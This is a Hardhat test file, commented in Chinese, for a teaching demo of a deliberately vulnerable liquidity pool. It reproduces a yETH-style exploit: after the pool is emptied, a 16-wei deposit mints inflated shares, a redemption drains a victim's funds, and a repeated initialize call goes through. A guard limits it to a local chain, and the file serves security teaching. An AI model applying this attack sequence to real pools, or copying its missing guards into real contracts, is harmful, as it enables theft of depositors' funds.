// ============================================================================
// test/vulnerable-demo.test.js
// ----------------------------------------------------------------------------
// !!! 本文件测试的是「故意留有缺陷」的教学版 VulnerablePool !!!
//
// 【测试通过 = 漏洞存在，这是证据，不是失败】
//   这里的每条 it 断言的都不是"合约表现正常"，而是"攻击确实成功了"：
//   微额存款铸出天量凭证、异常凭证把池内真实资产抽走、池子清空后二次 initialize 仍能过。
//   所以本文件全绿，意味着漏洞被稳定复现；某天它变红，反而说明 B 把教学缺陷"修掉了"，
//   演示素材与 PPT 里的攻击数据会一起消失——那不是好消息。
//
// 【安全边界（硬约束，违反即事故）】
//   · 只在 Hardhat 本地内存链（chainId 31337）运行；
//   · 禁止 `npx hardhat test --network sepolia`，禁止部署到任何公共网络；
//   · 不得作为交付物上线，不得指向真实资产。
//   · 文件级 before() 里有一道环境守卫：网络不是 hardhat / chainId 不是 31337 时
//     直接抛错，所有用例都不会执行，避免教学版被误跑到公共网络。
//
// 【缺陷模型与适配方式】
//   设计意图是想串联真实事件的三个环节：
//     (1) 状态/计算不一致 → 异常铸币（铸出凭证 >> 存入资产）
//     (2) 池子被抽空后，一次性初始化入口被再次使用
//     (3) 不安全的减法 / 异常计算 → 凭证数量进一步失控、记账值与真实余额分叉
//   注入点以 B 的《教学缺陷说明》为准（Q17）。本文件的所有操作**只用固定接口 +
//   可观测状态**（deposit / redeem / getPoolBalance / initialize / initialized /
//   shareToken / 凭证 totalSupply / 余额），不读任何内部变量，
//   因此无论 B 把缺陷写在哪一行，只要现象成立，测试就能抓到。
//   若实际现象与下面某一步不符，只需调整 ①②③ 处的"步骤"，三类断言必须保留：
//   异常铸币（VUL-02）、重复初始化（VUL-04）、状态失同步（VUL-05）。
//
// 【可重复性】
//   每个 it 前 beforeEach 重新部署，绝不依赖上一个 it 的残留状态。
//   攻击序列里不写魔法数字，全部走文件顶部常量。
//
// 【纪律】
//   C 不改 B 的合约。发现缺陷 → 写 docs/issue-log.md → 附最小复现命令 → 通知 B。
//   为了让测试变绿而修改合约，属违规。
//
// 【当前状态】B 的合约未落地前运行会报 "Artifact not found"，属预期。
// ============================================================================

const { expect } = require("chai");
const { ethers, network } = require("hardhat");

// ---------------------------------------------------------------------------
// 1. 参数：B 定稿后「只改这一块」
// ---------------------------------------------------------------------------
const DECIMALS = 18;
const INITIAL_MINT = ethers.parseUnits("10000", DECIMALS);

// TODO(api-spec.md): 两个代币的构造参数待 B 定稿（Q19）
const TEST_TOKEN_ARGS = [];
const SHARE_TOKEN_ARGS = [];

const POOL_NAME = "VulnerablePool";

// —— 攻击参数 ——
// 微额存款沿用真实事件的 16 wei 数量级，便于和事故数据对照（"16 wei 换走一池子"）
const DUST_AMOUNT = 16n;
// 池子的"历史存量"：用于制造缓存残留，也是攻击者最后要抽走的真实资产来源
const POOL_HISTORY = ethers.parseUnits("5000", DECIMALS);
// 喂给池子的真实资产（等价于"池子里本来就有其他用户的资金"）
const VICTIM_FUND = ethers.parseUnits("5000", DECIMALS);

// 异常铸币的判定倍数。为什么选 10：
//   · 1:1 规则下正常倍率恒等于 1，任何 >1 都已经构成缺陷；
//   · 选 10 而不是 2，是为了排除"实现细节上的固定系数/精度处理"造成的 1.5~2 倍误差，
//     避免把无关紧要的差异当成漏洞，让这条断言真正指向"数量级失控"；
//   · 同时 10 是个肉眼可判的整数门槛，PPT 上写"铸了 5000 倍"比"铸了 3.7 倍"更有说服力。
// 若 B 的实现倍率极大（例如 10^6 量级），把这里收紧到 100 或 1000，让证据更硬。
const ABNORMAL_MINT_MULTIPLIER = 10n;

// ---------------------------------------------------------------------------
// 2. 环境守卫（文件级，先于所有用例执行）
//    这里刻意不做成一条 it：守卫失败时必须让整个文件停摆，而不是"多一条红"
//    —— 教学版一旦跑在公共网络上，问题不是测试失败，而是事故。
// ---------------------------------------------------------------------------
before(async () => {
  const chainId = (await ethers.provider.getNetwork()).chainId;
  if (network.name !== "hardhat" || chainId !== 31337n) {
    throw new Error(
      `【阻断】漏洞教学版只允许在 Hardhat 本地链（chainId 31337）运行，` +
        `当前 network=${network.name}, chainId=${chainId}。请去掉 --network 参数后重跑。`
    );
  }
});

// ---------------------------------------------------------------------------
// 3. 夹具
// ---------------------------------------------------------------------------
async function deployFixture() {
  const [owner, alice, bob, attacker] = await ethers.getSigners();

  const assetToken = await ethers.deployContract("TestToken", TEST_TOKEN_ARGS);
  await assetToken.waitForDeployment();

  const shareToken = await ethers.deployContract("PoolShareToken", SHARE_TOKEN_ARGS);
  await shareToken.waitForDeployment();

  const pool = await ethers.deployContract(POOL_NAME);
  await pool.waitForDeployment();

  await pool.initialize(await assetToken.getAddress(), await shareToken.getAddress());

  for (const user of [alice, bob, attacker]) {
    await assetToken.connect(owner).mint(user.address, INITIAL_MINT);
    await assetToken.connect(user).approve(await pool.getAddress(), ethers.MaxUint256);
  }

  return { owner, alice, bob, attacker, assetToken, shareToken, pool };
}

// ---------------------------------------------------------------------------
// 4. 观测与打印工具（只读固定接口，不碰内部变量）
// ---------------------------------------------------------------------------

/** 抓一次关键状态：③totalSupply ④getPoolBalance() ⑤池真实余额 + 攻击者的 ①② */
async function snapshotState(ctx) {
  const { pool, assetToken, shareToken, attacker } = ctx;
  const poolAddress = await pool.getAddress();

  return {
    totalSupply: await shareToken.totalSupply(), // ③
    poolBalance: await pool.getPoolBalance(), // ④
    poolRealAssets: await assetToken.balanceOf(poolAddress), // ⑤
    attackerShares: await shareToken.balanceOf(attacker.address), // ②
    attackerAssets: await assetToken.balanceOf(attacker.address), // ①
  };
}

/** 单张状态表（用于"现在处在哪里"的交代）。 */
function printStateTable(label, s) {
  console.log(`\n───── ${label} ─────`);
  console.table([
    {
      totalSupply: s.totalSupply.toString(),
      getPoolBalance: s.poolBalance.toString(),
      池真实余额: s.poolRealAssets.toString(),
      偏差: (s.poolBalance - s.poolRealAssets).toString(),
      攻击者凭证: s.attackerShares.toString(),
      攻击者资产: s.attackerAssets.toString(),
    },
  ]);
}

/**
 * 操作前后对照表：每个关键步骤都打一张，格式固定，可直接截图进 PPT。
 * 列固定为「时点 / ③totalSupply / ④getPoolBalance / ⑤池真实余额 / ②攻击者凭证 / ①攻击者资产」，
 * 这样连续几张表竖着排下来，就能看出攻击是怎么一步步失控的。
 */
function printPair(label, before, after) {
  const row = (时点, s) => ({
    时点,
    "③totalSupply": s.totalSupply.toString(),
    "④getPoolBalance": s.poolBalance.toString(),
    "⑤池真实余额": s.poolRealAssets.toString(),
    "②攻击者凭证": s.attackerShares.toString(),
    "①攻击者资产": s.attackerAssets.toString(),
  });

  console.log(`\n───── ${label} ─────`);
  console.table([row("操作前", before), row("操作后", after)]);
}

/** 三方恒等断言：只在"正常状态"下使用；异常状态下三者本就应当分叉。 */
async function expectPoolState(pool, token, expectedPoolBalance, expectedTotalSupply) {
  const shareToken = await ethers.getContractAt("PoolShareToken", await pool.shareToken());
  const poolAddress = await pool.getAddress();

  expect(await pool.getPoolBalance(), "④ getPoolBalance() 与期望不符").to.equal(BigInt(expectedPoolBalance));
  expect(await token.balanceOf(poolAddress), "⑤ 池真实代币余额与期望不符").to.equal(BigInt(expectedPoolBalance));
  expect(await shareToken.totalSupply(), "③ totalSupply 与期望不符").to.equal(BigInt(expectedTotalSupply));
}

// ---------------------------------------------------------------------------
// 5. 攻击序列（供 VUL-02 / VUL-03 复用；步骤可调整，断言不变）
// ---------------------------------------------------------------------------
/**
 * 把池子推进到「缺陷态」：先有历史存量 → 全额赎回清空 → 缓存/记账残留。
 * 这一步对应真实攻击的"存取循环污染缓存 + 烧光 LP 让供应量归零"。
 * 返回清空后的状态，供后续断言使用。
 */
async function emptyPoolAndLeaveResidue(ctx) {
  const { alice, pool } = ctx;

  // ① 制造历史存量（这一步是正常的 1:1 存款）
  let before = await snapshotState(ctx);
  await (await pool.connect(alice).deposit(POOL_HISTORY)).wait();
  let after = await snapshotState(ctx);
  printPair("攻击步骤① 受害者存入 5000（制造历史存量）", before, after);

  // ② 全额赎回，把池子抽空：totalSupply 归零，但缺陷版不会同步清理缓存/记账值
  before = after;
  await (await pool.connect(alice).redeem(POOL_HISTORY)).wait();
  after = await snapshotState(ctx);
  printPair("攻击步骤② 全额赎回，池子被清空（关键：此时是否已成缺陷态）", before, after);

  return after;
}

// ---------------------------------------------------------------------------
// 6. 用例
// ---------------------------------------------------------------------------
describe("漏洞教学版：异常铸币演示", () => {
  let ctx;
  beforeEach(async () => {
    ctx = await deployFixture(); // 每个 it 重建，保证演示可重复
  });

  // 为什么必须先跑这条基线：
  //   如果漏洞版在正常状态下就铸不准，那后面"微额存款铸出天量凭证"只能证明
  //   "这个合约本来就不会算"，无法证明"是异常状态触发的"。
  //   先钉死 1:1 基线，才能把后面的失真归因到具体的缺陷环节上。
  it("正常存款仍按 1:1 记账（作为对照基线）", async () => {
    const { alice, attacker, assetToken, shareToken, pool } = ctx;
    const amount = 100n;

    const before = await snapshotState(ctx);
    printStateTable("基线：存款前", before);

    const tx = await pool.connect(alice).deposit(amount);
    await tx.wait();

    const after = await snapshotState(ctx);
    printPair("基线：正常存入 100", before, after);

    // 1:1：存入 100 → 铸出 100，且三方一致
    const aliceShares = await shareToken.balanceOf(alice.address);
    expect(aliceShares, "教学版在正常状态下也必须严格 1:1（否则后面的失真无法归因）").to.equal(amount);
    await expectPoolState(pool, assetToken, amount, amount);

    await expect(tx).to.emit(pool, "Deposited").withArgs(alice.address, amount, amount);
    expect(await assetToken.balanceOf(attacker.address), "本步骤不应动用攻击者资金").to.equal(INITIAL_MINT);
  });

  // VUL-02：核心证据。
  // 断言 sharesMinted > 16 × 10 = 160 的意义：
  //   1:1 规则下 16 的最小单位最多只该换 16 个凭证，160 已经是应有数量的 10 倍；
  //   超过这个门槛就不再是"精度误差"，而是数量级失控——足以说明换算基准被污染了。
  it("构造异常状态后，微额存款铸出远超存入量的凭证", async () => {
    const { attacker, pool } = ctx;

    // ①② 先把池子清空并留下残留（缺陷态）
    const emptied = await emptyPoolAndLeaveResidue(ctx);
    printStateTable("缺陷态确认：池已清空", emptied);

    // ③ 攻击者投入 16 个最小单位
    const before = await snapshotState(ctx);
    const tx = await pool.connect(attacker).deposit(DUST_AMOUNT);
    await tx.wait();
    const after = await snapshotState(ctx);
    printPair(`攻击步骤③ 攻击者存入 ${DUST_AMOUNT} 最小单位`, before, after);

    // —— 断言一：异常铸币 ——
    const sharesMinted = after.attackerShares;
    const threshold = DUST_AMOUNT * ABNORMAL_MINT_MULTIPLIER;

    console.log(
      `\n【异常铸币】投入=${DUST_AMOUNT} 最小单位，铸出=${sharesMinted} 凭证，` +
        `倍率≈${Number(sharesMinted) / Number(DUST_AMOUNT)} 倍（阈值 ${ABNORMAL_MINT_MULTIPLIER} 倍）`
    );

    expect(sharesMinted, "未能复现异常铸币：凭证数未超过存入量的 10 倍，请核对 B 的缺陷注入点（Q17）").to.be.greaterThan(
      threshold
    );

    // 存款事件里 assets / shares 已经不再相等——这是最直接的"1:1 被打破"证据
    const receipt = await tx.wait();
    const depositLog = receipt.logs
      .map((log) => {
        try {
          return pool.interface.parseLog(log);
        } catch {
          return null;
        }
      })
      .find((parsed) => parsed && parsed.name === "Deposited");
    if (depositLog) {
      console.log(
        `【事件证据】Deposited(user, assets=${depositLog.args.assets}, shares=${depositLog.args.shares})`
      );
      expect(depositLog.args.assets, "事件里的 assets 应等于实际投入").to.equal(DUST_AMOUNT);
      expect(depositLog.args.shares, "事件里的 shares 应远大于 assets（1:1 已被打破）").to.equal(sharesMinted);
    }

    // —— 断言二：状态失同步（③ 与 ⑤ 已经分开）——
    // 铸出了天量凭证，但池内真实资产只多了 16，账面与真实从此分叉
    expect(after.poolRealAssets, "池内真实资产只应增加这 16 个最小单位").to.equal(
      emptied.poolRealAssets + DUST_AMOUNT
    );
    expect(after.totalSupply, "凭证供应量已被异常抬高").to.be.greaterThan(DUST_AMOUNT);
  });

  // VUL-03：把"账面虚增"变成"真实资产流失"。
  // 这一步是评估危害的关键：铸出来的凭证如果换不出东西，漏洞就只是账面噪音。
  it("异常凭证赎回导致池内真实资产被抽走", async () => {
    const { attacker, pool, assetToken } = ctx;

    // 复现异常铸币（与 VUL-02 同一序列，保证结论一致）
    await emptyPoolAndLeaveResidue(ctx);
    await (await pool.connect(attacker).deposit(DUST_AMOUNT)).wait();
    const broken = await snapshotState(ctx);
    printStateTable("异常铸币完成后", broken);

    // 让池子里有真实资产可抽。
    // 这里用"直接转账"而不是让第二个用户 deposit，是因为后者在缺陷态下同样会被异常铸币，
    // 会把攻击者的份额占比稀释掉，导致演示结果不稳定。
    // 直接转入等价于"池子里本来就有其他用户的资金"，且不改变凭证供应量。
    await (await assetToken.transfer(await pool.getAddress(), VICTIM_FUND)).wait();

    const before = await snapshotState(ctx);
    printStateTable("赎回前：池内已有真实资产", before);

    // 攻击者把手里的异常凭证全部赎回
    const tx = await pool.connect(attacker).redeem(broken.attackerShares);
    await tx.wait();

    const after = await snapshotState(ctx);
    printPair("攻击步骤④ 异常凭证全额赎回", before, after);

    // —— 核心断言：取回 > 投入 ——
    const invested = DUST_AMOUNT;
    const gained = after.attackerAssets - before.attackerAssets;
    const poolLeft = after.poolRealAssets;

    console.log(
      `\n【资产流失】投入=${invested} 最小单位 | 取回=${gained} 最小单位 | ` +
        `池子剩余=${poolLeft} 最小单位 | 净收益=${gained - invested}`
    );

    expect(gained, "未能复现资产流失：攻击者取回的资产未超过其投入").to.be.greaterThan(invested);
    expect(poolLeft, "池内真实资产应被抽空（或被抽到接近 0）").to.be.lessThan(VICTIM_FUND);

    // 附加记录（不强制断言）：若此刻 ④ 与 ⑤ 仍不相等，说明"不安全减法/记账未同步"
    // 这一环也成立，可直接作为 security-report 里第 (3) 环的证据。
    const desync = after.poolBalance - after.poolRealAssets;
    console.log(
      `【附加证据】getPoolBalance()=${after.poolBalance} vs 池真实余额=${after.poolRealAssets}，` +
        `偏差=${desync}${desync !== 0n ? "（记账与真实资产已分叉）" : "（本实现未体现该环节）"}`
    );

    await expect(tx).to.emit(pool, "Redeemed");
  });
});

describe("漏洞教学版：重复初始化", () => {
  let ctx;
  beforeEach(async () => {
    ctx = await deployFixture();
  });

  // 为什么这条能说明"一次性初始化保护缺失"：
  //   真正带守卫的实现，第二次 initialize 必须 revert（修复版见 secure-pool.test.js 的 SEC-10）。
  //   这里的关键不是 initialized() 变没变——而是"调用根本没有被拒绝"。
  //   更能说明危害的是"关键状态被改写"：用一个全新的凭证合约地址再次初始化，
  //   池子会转身认这个新凭证，旧凭证（连同攻击者手里那堆）瞬间失去意义。
  it("池子被清空后二次调用 initialize 仍然成功", async () => {
    const { owner, alice, pool, shareToken, assetToken } = ctx;

    // 先把池子清空，模拟"回到初始化态"（真实攻击里的第 3 阶段）
    await (await pool.connect(alice).deposit(POOL_HISTORY)).wait();
    await (await pool.connect(alice).redeem(POOL_HISTORY)).wait();

    const initializedBefore = await pool.initialized();
    const shareTokenBefore = await pool.shareToken();
    console.log(
      `\n【二次初始化前】initialized()=${initializedBefore}  shareToken()=${shareTokenBefore}  ` +
        `totalSupply=${await shareToken.totalSupply()}  getPoolBalance()=${await pool.getPoolBalance()}`
    );

    // 准备一套全新的代币，用来验证"关键状态变量被改写"
    const assetToken2 = await ethers.deployContract("TestToken", TEST_TOKEN_ARGS);
    await assetToken2.waitForDeployment();
    const shareToken2 = await ethers.deployContract("PoolShareToken", SHARE_TOKEN_ARGS);
    await shareToken2.waitForDeployment();

    // 第二次调用 initialize —— 教学版不会回滚
    const tx = await pool.connect(owner).initialize(await assetToken2.getAddress(), await shareToken2.getAddress());
    await tx.wait();

    const initializedAfter = await pool.initialized();
    const shareTokenAfter = await pool.shareToken();

    console.log(`\n───── 二次 initialize 前后对照 ─────`);
    console.table([
      {
        时点: "调用前",
        "initialized()": initializedBefore.toString(),
        "shareToken()": shareTokenBefore,
      },
      {
        时点: "调用后",
        "initialized()": initializedAfter.toString(),
        "shareToken()": shareTokenAfter,
      },
    ]);

    // —— 断言一：调用没有被拒绝 ——
    // 说明里要求"必须回滚"的那个入口，在教学版上畅通无阻
    expect(initializedAfter, "二次 initialize 之后 initialized() 仍应为 true（没有回到 false 就算成功改写）").to.equal(
      true
    );

    // —— 断言二：关键状态变量被改写 ——
    // 池子改认新的凭证合约，等于把旧账整体作废
    expect(shareTokenAfter, "二次 initialize 未改写 shareToken()，请核对 B 的缺陷注入点（Q17）").to.not.equal(
      shareTokenBefore
    );
    expect(shareTokenAfter, "shareToken() 应指向第二次传入的新凭证合约").to.equal(await shareToken2.getAddress());

    // 旧凭证还在，但池子已经不认它了——这种"凭证与池子脱钩"本身就是最危险的状态
    console.log(
      `【危害】旧凭证 totalSupply=${await shareToken.totalSupply()}（仍然存在），` +
        `但池子已改认新凭证 ${shareTokenAfter}；旧凭证从此无法赎回，等价于账面资产被清零。`
    );

    // 修复版对照：同一操作必须回滚 → test/secure-pool.test.js 的 SEC-10
    // （本文件不做修复版断言，避免两个文件的结论互相污染）
    expect(await assetToken.balanceOf(await pool.getAddress()), "新资产的池内余额应为 0（尚未有人存入）").to.equal(0n);
  });
});

describe("漏洞教学版：状态失同步", () => {
  let ctx;
  beforeEach(async () => {
    ctx = await deployFixture();
  });

  // 为什么单独测"失同步"：
  //   异常铸币是"结果"，失同步是"原因"。yETH 事件里被破坏的不变量就是
  //   「池子记账值 == 池内真实资产」；只要这条不成立，任何按记账值计算的换算
  //   都会把误差放大到数量级级别。单独把这条偏差量出来，
  //   security-report 才能写清"根因不是某一行的算术，而是缺少不变量维护"。
  it("抽空后 getPoolBalance() 与池内真实余额出现偏差", async () => {
    const { alice, pool, assetToken } = ctx;

    // 正常存款时，两者应当完全一致（先把"健康基线"钉住）
    await (await pool.connect(alice).deposit(POOL_HISTORY)).wait();
    const healthyPoolBalance = await pool.getPoolBalance();
    const healthyRealBalance = await assetToken.balanceOf(await pool.getAddress());
    console.log(
      `\n【健康基线】getPoolBalance()=${healthyPoolBalance}  池真实余额=${healthyRealBalance}（应相等）`
    );
    expect(healthyPoolBalance, "正常存款后记账值与真实余额应相等").to.equal(healthyRealBalance);

    // 全额赎回，把池子抽空
    await (await pool.connect(alice).redeem(POOL_HISTORY)).wait();

    const brokenPoolBalance = await pool.getPoolBalance();
    const brokenRealBalance = await assetToken.balanceOf(await pool.getAddress());
    const deviation = brokenPoolBalance - brokenRealBalance;

    console.log(`\n───── 抽空后的失同步 ─────`);
    console.table([
      {
        时点: "正常存款后",
        "getPoolBalance()": healthyPoolBalance.toString(),
        池真实余额: healthyRealBalance.toString(),
        偏差: (healthyPoolBalance - healthyRealBalance).toString(),
      },
      {
        时点: "全额赎回后",
        "getPoolBalance()": brokenPoolBalance.toString(),
        池真实余额: brokenRealBalance.toString(),
        偏差: deviation.toString(),
      },
    ]);

    // —— 核心断言：两者不相等 ——
    // 真实余额已经归零，但记账值还留着旧数——残留的就是后面被放大的"分母/基准"
    expect(brokenRealBalance, "池内真实资产应已归零").to.equal(0n);
    expect(brokenPoolBalance, "状态失同步未复现：getPoolBalance() 仍与真实余额相等，请核对 B 的缺陷注入点（Q17）").to.not.equal(
      brokenRealBalance
    );

    console.log(
      `【偏差】getPoolBalance()=${brokenPoolBalance} 而真实余额=${brokenRealBalance}，` +
        `残留记账值 ${deviation} 就是下一步异常铸币的计算基准。`
    );
  });
});

// 备注：
// · 本文件的三类断言（异常铸币 / 重复初始化 / 状态失同步）必须保留；
//   B 的实现若与设计意图不同，只能调整 emptyPoolAndLeaveResidue() 里的步骤与常量，
//   不能因为"跑不过"就删断言。
// · 若 VUL-03 的"异常凭证全额赎回"被 revert（说明该实现校验了池内资产是否充足），
//   处置顺序是：① 改成分多笔赎回（每次赎回池内余额对应的份额），看累计取回是否超过投入；
//   ② 若始终无法超过，说明第 (3) 环"不安全减法/记账不同步"在 B 的实现里不存在，
//      此时带着"VUL-02 已复现异常铸币、但无法变现"的结论去找 B 核对缺陷注入点（Q17），
//      并在 security-report 里如实写成"可复现异常铸币，未复现资产流失"——不要为了凑结论改断言。
// · 运行方式：npx hardhat test test/vulnerable-demo.test.js
// · 结果解读：全绿 = 漏洞存在（这是交付需要的证据）；红 = 缺陷未被复现，需与 B 对齐实现。
